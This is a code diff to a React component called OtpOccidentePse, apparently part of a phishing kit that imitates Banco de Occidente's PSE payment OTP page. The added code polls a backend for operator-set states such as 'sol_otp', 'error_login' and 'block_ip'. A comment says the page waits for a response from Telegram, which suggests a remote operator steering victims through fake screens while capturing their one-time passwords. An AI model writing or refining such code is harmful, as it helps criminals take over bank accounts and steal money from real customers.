@@ -183,16 +183,22 @@ export default function OtpOccidentePse() {
           pollingIntervalRef.current = setTimeout(poll, 3000);
           return;
         }
+        // Si se envió el OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando respuesta de Telegram
+        if (getLoading && (estadoActual === "sol_otp" || estadoActual === "pendiente")) {
+          pollingIntervalRef.current = setTimeout(poll, 2500);
+          return;
+        }
+
         lastEstadoRef.current = estadoActual;
 
         // Estados que detienen el polling
         const stateValid = [
-          "sol_otp", "error_otp", "error_login", "sol_finalizar", "block_ip", "error_blocked",
+          "error_otp", "error_login", "sol_finalizar", "block_ip", "error_blocked",
         ];
 
         // Solo se programa el siguiente timeout si NO es estado terminal
         if (!stateValid.includes(estadoActual)) {
-          pollingIntervalRef.current = setTimeout(poll, 3000);
+          pollingIntervalRef.current = setTimeout(poll, 2500);
         } else {
           pollingIntervalRef.current = null;
         }
@@ -254,6 +260,10 @@ export default function OtpOccidentePse() {
       },
     };
 
+    stopPolling();
+    lastEstadoRef.current = null;
+    modalBloqueoEstadoRef.current = null;
+    ignorarEstadoHastaCambioRef.current = null;
     try {
       setLoading(true);
       const response = centralUrl
